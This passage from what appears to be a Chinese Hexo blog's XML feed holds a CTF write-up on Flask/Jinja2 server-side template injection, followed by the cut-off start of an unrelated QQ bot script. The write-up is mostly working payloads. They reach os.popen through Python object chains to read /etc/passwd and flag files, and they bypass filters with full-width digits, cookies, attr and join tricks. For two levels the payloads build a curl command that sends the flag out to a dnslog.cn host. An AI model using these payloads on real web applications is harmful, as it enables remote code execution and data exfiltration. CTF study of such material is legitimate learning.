class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>        <h3 id="代码块"   >          <a href="#代码块" class="heading-link"><i class="fas fa-link"></i></a><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h3>      <pre class="line-numbers language-none"><code class="language-none">变量块 &#123;&#123;&#125;&#125;用于将表达式打印到模板输出注释块 &#123;##&#125;注释控制块&#123;%%&#125;可以声明变量，也可以执行语句行声明##可以有和&#123;%%&#125;相同的效果<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>        <h3 id="常用的过滤器"   >          <a href="#常用的过滤器" class="heading-link"><i class="fas fa-link"></i></a><a href="#常用的过滤器" class="headerlink" title="常用的过滤器"></a>常用的过滤器</h3>      <pre class="line-numbers language-none"><code class="language-none">int()：将值转换为int类型；float()：将值转换为float类型；lower()：将字符串转换为小写；upper()：将字符串转换为大写；title()：把值中的每个单词的首字母都转成大写；capitalize()：把变量值的首字母转成大写，其余字母转小写；trim()：截取字符串前面和后面的空白字符；wordcount()：计算一个长字符串中单词的个数；reverse()：字符串反转；replace(value,old,new)： 替换将old替换为new的字符串；truncate(value,length&#x3D;255,killwords&#x3D;False)：截取length长度的字符串；striptags()：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；escape()或e：转义字符，会将&lt;、&gt;等符号转义成HTML中的符号。显例：content|escape或content|e。safe()： 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： &#123;&#123;&#39;&lt;em&gt;hello&lt;&#x2F;em&gt;&#39;|safe&#125;&#125;；list()：将变量列成列表；string()：将变量转换成字符串；join()：将一个序列中的参数值拼接成字符串。示例看上面payload；abs()：返回一个数值的绝对值；first()：返回一个序列的第一个元素；last()：返回一个序列的最后一个元素；format(value,arags,*kwargs)：格式化字符串。比如：&#123;&#123; &quot;%s&quot; - &quot;%s&quot;|format(&#39;Hello?&#39;,&quot;Foo!&quot;) &#125;&#125;将输出：Helloo? - Foo!length()：返回一个序列或者字典的长度；sum()：返回列表内数值的和；sort()：返回排序后的列表；default(value,default_value,boolean&#x3D;false)：如果当前变量没有值，则会使用参数中的值来代替。示例：name|default(&#39;xiaotuo&#39;)----如果name不存在，则会使用xiaotuo来替代。boolean&#x3D;False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean&#x3D;true。也可以使用or来替换。length()返回字符串的长度，别名是count<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>        <h3 id="Flask的一些全局变量-amp-amp-关键字"   >          <a href="#Flask的一些全局变量-amp-amp-关键字" class="heading-link"><i class="fas fa-link"></i></a><a href="#Flask的一些全局变量-amp-amp-关键字" class="headerlink" title="Flask的一些全局变量 &amp;&amp; 关键字"></a><strong>Flask的一些全局变量 &amp;&amp; 关键字</strong></h3>      <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>config<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>requests<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>requests<span class="token punctuation">.</span>environ<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>self<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>url_for<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>get_flashed_messages<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">"os"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'calc'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>        <h3 id="常用payload"   >          <a href="#常用payload" class="heading-link"><i class="fas fa-link"></i></a><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h3>      <pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt;&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read()&gt;&gt;&gt;&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)&#x2F;&#x2F;想要获取命令执行结果可以在后面加上.read()&gt;&gt;&gt;&#39;&#39;.__class__.__mro__[1].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&#39;cat fl4g&#39;).read() -------------------------------- &gt;&gt;&gt;object.__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#39;id&#39;).read()&gt;&gt;&gt;object.__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)&gt;&gt;&gt;object.__subclasses__()[59].__init__.__globals__.__builtins__.eval(&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)&gt;&gt;&gt;object.__subclasses__()[59].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&gt;&gt;&gt;object.__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).popen(&#39;id&#39;).read() --------------------------------&#123;&#123;&#39;&#39;.__class__.__mro__[-1].__subclasses__()[200](&#39;calc&#39;) &#125;&#125;其中的xxxx可以为任意字符&#123;&#123;&#39;&#39;.__class__.__mro__[-1].__subclasses__().xxxx.__init__.__globals__.__builtins__.eval(&quot;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&quot;) &#125;&#125;&#123;&#123;&#39;&#39;.__class__.__mro__[-1].__subclasses__().xxxx.__init__.__globals__.__builtins__.exec(&quot;__import__(&#39;os&#39;).popen(&#39;calc&#39;).read()&quot;) &#125;&#125; #本地测试不知道为什么执行whoami只会返回None<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><span class="exturl"><a class="exturl__link"   href="https://dar1in9s.github.io/2020/09/15/ssti%E8%BF%9B%E9%98%B6/" >拓展</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>        <h3 id="16进制绕过"   >          <a href="#16进制绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#16进制绕过" class="headerlink" title="16进制绕过"></a>16进制绕过</h3>      <p>可使用16进制绕过关键字符</p><pre class="line-numbers language-none"><code class="language-none">\x5f _<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>寻找可用类脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> jsona <span class="token operator">=</span> <span class="token triple-quoted-string string">""""""</span>num <span class="token operator">=</span> <span class="token number">0</span>allList <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>result <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> a<span class="token punctuation">:</span>    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token string">">"</span><span class="token punctuation">:</span>        result <span class="token operator">+=</span> i        allList<span class="token punctuation">.</span>append<span class="token punctuation">(</span>result<span class="token punctuation">)</span>        result <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">elif</span> i <span class="token operator">==</span> <span class="token string">"\n"</span> <span class="token keyword">or</span> i <span class="token operator">==</span> <span class="token string">","</span><span class="token punctuation">:</span>        <span class="token keyword">continue</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        result <span class="token operator">+=</span> i<span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>allList<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">"os._wrap_close"</span> <span class="token keyword">in</span> v<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"--->"</span> <span class="token operator">+</span> v<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>        <h4 id="除了python之外的SSTI"   >          <a href="#除了python之外的SSTI" class="heading-link"><i class="fas fa-link"></i></a><a href="#除了python之外的SSTI" class="headerlink" title="除了python之外的SSTI"></a><span class="exturl"><a class="exturl__link"   href="https://www.cnblogs.com/bmjoker/p/13508538.html" >除了python之外的SSTI</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></h4>      <p><strong>361</strong></p><p>无过滤，参数名为name，直接执行命令即可</p><pre class="line-numbers language-none"><code class="language-none">payload:?name&#x3D;&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[132].__init__.__globals__[&#39;popen&#39;](&#39;tac &#x2F;flag&#39;).read()&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>362</strong></p><p>过滤了数字，使用全角数字代替正常数字</p><pre class="line-numbers language-none"><code class="language-none">payload:?name&#x3D;&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[１３２].__init__.__globals__[&#39;popen&#39;](&#39;tac &#x2F;flag&#39;).read()&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>363</strong></p><p>过滤了单双引号，可通过request.args传入新参数解决，或者使用chr来绕过</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;request.argspayload:?name&#x3D;&#123;&#123;config.__class__.__init__.__globals__[request.args.a][request.args.b](request.args.c).read()&#125;&#125;&amp;a&#x3D;os&amp;b&#x3D;popen&amp;c&#x3D;tac &#x2F;flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;chrpayload:?name&#x3D;&#123;% set chr&#x3D;url_for.__globals__.__builtins__.chr %&#125;&#123;&#123;url_for.__globals__[chr(111)%2bchr(115)].popen(chr(116)%2bchr(97)%2bchr(99)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)).read()&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>364</strong></p><p>过滤了args，无法使用GET传参了，使用<del>POST（方法被禁用了）</del>或者cookie都可</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;cookiepayload:?name&#x3D;&#123;&#123;config.__class__.__init__.__globals__[request.cookies.a][request.cookies.b](request.cookies.c).read()&#125;&#125;Cookie: a&#x3D;os;b&#x3D;popen;c&#x3D;tac &#x2F;flag;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;chrpayload:?name&#x3D;&#123;% set chr&#x3D;url_for.__globals__.__builtins__.chr %&#125;&#123;&#123;url_for.__globals__[chr(111)%2bchr(115)].popen(chr(116)%2bchr(97)%2bchr(99)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)).read()&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>365</strong></p><p>过滤了中括号，换点</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;cookiepayload:?name&#x3D;&#123;&#123;config.__class__.__init__.__globals__.os.popen(request.cookies.a).read()&#125;&#125;Cookie: a&#x3D;tac &#x2F;flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>366</strong></p><p>过滤了下划线，这里用attr方法：request|attr(request.cookies.a)等价于request[“a”]</p><pre class="line-numbers language-none"><code class="language-none">payload:?name&#x3D;&#123;&#123;(config|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies.c)).os.popen(request.cookies.d).read()&#125;&#125;Cookie: a&#x3D;__class__; b&#x3D;__init__; c&#x3D;__globals__; d&#x3D;tac &#x2F;flag;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>他人WP</p><pre class="line-numbers language-none"><code class="language-none">payload:?name&#x3D;&#123;&#123;(lipsum|attr(request.cookies.a)).os.popen(request.cookies.b).read()&#125;&#125;Cookie: a&#x3D;__globals__;b&#x3D;cat &#x2F;flag;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>367</strong></p><p>过滤了os，继续用attr</p><pre class="line-numbers language-none"><code class="language-none">payload:?name&#x3D;&#123;&#123;(config|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies.c)).get(request.cookies.e).popen(request.cookies.d).read()&#125;&#125;Cookie: a&#x3D;__class__; b&#x3D;__init__; c&#x3D;__globals__; d&#x3D;tac &#x2F;flag; e&#x3D;os;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>368</strong></p><p>过滤了{undefined{undefined，使用命令方式print</p><pre class="line-numbers language-none"><code class="language-none">payload:?name&#x3D;&#123;% print((config|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies.c)).get(request.cookies.e).popen(request.cookies.d).read()) %&#125;Cookie: a&#x3D;__class__; b&#x3D;__init__; c&#x3D;__globals__; d&#x3D;tac &#x2F;flag; e&#x3D;os;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>369</strong></p><p>过滤了request，没办法传递参量了，使用模版过滤器</p><pre class="line-numbers language-none"><code class="language-none">payload:?name&#x3D;&#123;% set po&#x3D;dict(po&#x3D;a,p&#x3D;a)|join%&#125;&#x2F;&#x2F;构造pop，为下方提供_&#123;% set a&#x3D;(()|select|string|list)|attr(po)(24)%&#125;&#x2F;&#x2F;构造出_&#123;% set ini&#x3D;(a,a,dict(init&#x3D;a)|join,a,a)|join()%&#125;&#x2F;&#x2F;构造出__init__&#123;% set glo&#x3D;(a,a,dict(globals&#x3D;a)|join,a,a)|join()%&#125;&#x2F;&#x2F;构造出__globals__&#123;% set geti&#x3D;(a,a,dict(getitem&#x3D;a)|join,a,a)|join()%&#125;&#x2F;&#x2F;构造出__getitem__&#123;% set built&#x3D;(a,a,dict(builtins&#x3D;a)|join,a,a)|join()%&#125;&#x2F;&#x2F;构造出__builtins__&#123;% set x&#x3D;(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;&#x2F;&#x2F;构造出builtins模块&#123;% set chr&#x3D;x.chr%&#125;&#x2F;&#x2F;使用chr函数&#123;% set file&#x3D;chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%&#125;&#x2F;&#x2F;构造出字符串&#x2F;flag&#123;%print(x.open(file).read())%&#125;&#x2F;&#x2F;读文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>370</strong></p><p>过滤数字用全角，或者使用length，count构造数字</p><pre class="line-numbers language-none"><code class="language-none">payload:?name&#x3D;&#123;% set po&#x3D;dict(po&#x3D;a,p&#x3D;a)|join%&#125;&#123;% set a&#x3D;(()|select|string|list)|attr(po)(２４)%&#125;&#123;% set ini&#x3D;(a,a,dict(init&#x3D;a)|join,a,a)|join()%&#125;&#123;% set glo&#x3D;(a,a,dict(globals&#x3D;a)|join,a,a)|join()%&#125;&#123;% set geti&#x3D;(a,a,dict(getitem&#x3D;a)|join,a,a)|join()%&#125;&#123;% set built&#x3D;(a,a,dict(builtins&#x3D;a)|join,a,a)|join()%&#125;&#123;% set x&#x3D;(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;&#123;% set chr&#x3D;x.chr%&#125;&#123;% set file&#x3D;chr(４７)%2bchr(１０２)%2bchr(１０８)%2bchr(９７)%2bchr(１０３)%&#125;&#123;%print(x.open(file).read())%&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>371</strong></p><p>print回显被禁，dnslog外带</p><pre class="line-numbers language-none"><code class="language-none">?name&#x3D;&#123;%set po&#x3D;(dict(po&#x3D;a,p&#x3D;a)|join)%&#125;&#123;% set ershisi&#x3D;(dict(eeeeeeeeeeeeeeeeeeeeeeee&#x3D;a)|join|length)%&#125;&#123;% set xiahuaxian&#x3D;(()|select|string|list)|attr(po)(ershisi)%&#125;&#123;% set ur&#x3D;((dict(ur&#x3D;a,l&#x3D;a)|join,xiahuaxian,dict(fo&#x3D;a,r&#x3D;a)|join)|join)%&#125;&#123;% set glo&#x3D;((xiahuaxian,xiahuaxian,dict(globals&#x3D;a)|join,xiahuaxian,xiahuaxian)|join)%&#125;&#123;% set ous&#x3D;(dict(o&#x3D;a,s&#x3D;a)|join)%&#125;&#123;% set ouuu&#x3D;(ur|attr(glo)|attr(ous))%&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">?name&#x3D;&#123;%set a&#x3D;dict(po&#x3D;aa,p&#x3D;aa)|join%&#125;&#123;%set j&#x3D;dict(eeeeeeeeeeeeeeeeee&#x3D;a)|join|length%&#125;&#123;%set k&#x3D;dict(eeeeeeeee&#x3D;a)|join|length%&#125;&#123;%set l&#x3D;dict(eeeeeeee&#x3D;a)|join|length%&#125;&#123;%set n&#x3D;dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee&#x3D;a)|join|length%&#125;&#123;%set m&#x3D;dict(eeeeeeeeeeeeeeeeeeee&#x3D;a)|join|length%&#125;&#123;% set b&#x3D;(lipsum|string|list)|attr(a)(j)%&#125;&#123;%set c&#x3D;(b,b,dict(glob&#x3D;cc,als&#x3D;aa)|join,b,b)|join%&#125;&#123;%set d&#x3D;(b,b,dict(getit&#x3D;cc,em&#x3D;aa)|join,b,b)|join%&#125;&#123;%set e&#x3D;dict(o&#x3D;cc,s&#x3D;aa)|join%&#125;&#123;% set f&#x3D;(lipsum|string|list)|attr(a)(k)%&#125;&#123;%set g&#x3D;(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-l)%&#125;&#123;%set p&#x3D;((lipsum|attr(c))|string|list)|attr(a)(n)%&#125;&#123;%set q&#x3D;((lipsum|attr(c))|string|list)|attr(a)(m)%&#125;&#123;%set i&#x3D;(dict(curl&#x3D;aa)|join,f,p,dict(cat&#x3D;a)|join,f,g,dict(flag&#x3D;aa)|join,p,q,dict(czducq&#x3D;a)|join,q,dict(dnslog&#x3D;a)|join,q,dict(cn&#x3D;a)|join)|join%&#125;&#123;%if ((lipsum|attr(c))|attr(d)(e)).popen(i)%&#125;&#123;%endif%&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>372</strong></p><p>count换成length</p><pre class="line-numbers language-none"><code class="language-none">?name&#x3D;&#123;%set a&#x3D;dict(po&#x3D;aa,p&#x3D;aa)|join%&#125;&#123;%set j&#x3D;dict(eeeeeeeeeeeeeeeeee&#x3D;a)|join|length%&#125;&#123;%set k&#x3D;dict(eeeeeeeee&#x3D;a)|join|length%&#125;&#123;%set l&#x3D;dict(eeeeeeee&#x3D;a)|join|length%&#125;&#123;%set n&#x3D;dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee&#x3D;a)|join|length%&#125;&#123;%set m&#x3D;dict(eeeeeeeeeeeeeeeeeeee&#x3D;a)|join|length%&#125;&#123;% set b&#x3D;(lipsum|string|list)|attr(a)(j)%&#125;&#123;%set c&#x3D;(b,b,dict(glob&#x3D;cc,als&#x3D;aa)|join,b,b)|join%&#125;&#123;%set d&#x3D;(b,b,dict(getit&#x3D;cc,em&#x3D;aa)|join,b,b)|join%&#125;&#123;%set e&#x3D;dict(o&#x3D;cc,s&#x3D;aa)|join%&#125;&#123;% set f&#x3D;(lipsum|string|list)|attr(a)(k)%&#125;&#123;%set g&#x3D;(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-l)%&#125;&#123;%set p&#x3D;((lipsum|attr(c))|string|list)|attr(a)(n)%&#125;&#123;%set q&#x3D;((lipsum|attr(c))|string|list)|attr(a)(m)%&#125;&#123;%set i&#x3D;(dict(curl&#x3D;aa)|join,f,p,dict(cat&#x3D;a)|join,f,g,dict(flag&#x3D;aa)|join,p,q,dict(czducq&#x3D;a)|join,q,dict(dnslog&#x3D;a)|join,q,dict(cn&#x3D;a)|join)|join%&#125;&#123;%if ((lipsum|attr(c))|attr(d)(e)).popen(i)%&#125;&#123;%endif%&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
            <tag> SSTI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>罗伯特</title>
      <link href="/posts/61106.html"/>
      <url>/posts/61106.html</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#bot.py</span><span class="token keyword">from</span> unittest<span class="token punctuation">.</span>mock <span class="token keyword">import</span> NonCallableMagicMock<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token keyword">import</span> requests<span class="token keyword">import</span> apiapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''监听端口，获取QQ信息'''</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">post_data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token string">'下面的request.get_json().get......是用来获取关键字的值用的，关键字参考上面代码段的数据格式'</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>get_json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'message_type'</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">'private'</span><span class="token punctuation">:</span>        uid <span class="token operator">=</span> request<span class="token punctuation">.</span>get_json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'sender'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'user_id'</span><span class="token punctuation">)</span>        message <span class="token operator">=</span> request<span class="token punctuation">.</span>get_json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'raw_message'</span><span class="token punctuation">)</span>        api<span class="token punctuation">.</span>keywordForPerson<span class="token punctuation">(</span>message<span class="token punctuation">,</span>uid<span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>get_json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'message_type'</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">'group'</span><span class="token punctuation">:</span>        gid <span class="token operator">=</span> request<span class="token punctuation">.</span>get_json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'group_id'</span><span class="token punctuation">)</span>        uid <span class="token operator">=</span> request<span class="token punctuation">.</span>get_json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'sender'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'user_id'</span><span class="token punctuation">)</span>        message <span class="token operator">=</span> request<span class="token punctuation">.</span>get_json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'raw_message'</span><span class="token punctuation">)</span>        nick<span class="token operator">=</span>request<span class="token punctuation">.</span>get_json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'sender'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'nickname'</span><span class="token punctuation">)</span>        role<span class="token operator">=</span>request<span class="token punctuation">.</span>get_json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'sender'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'role'</span><span class="token punctuation">)</span>        api<span class="token punctuation">.</span>keywordForGroup<span class="token punctuation">(</span>message<span class="token punctuation">,</span> gid<span class="token punctuation">,</span> uid<span class="token punctuation">,</span>nick<span class="token punctuation">,</span>role<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">'OK'</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5701</span><span class="token punctuation">)</span><span aria-hidden="true" 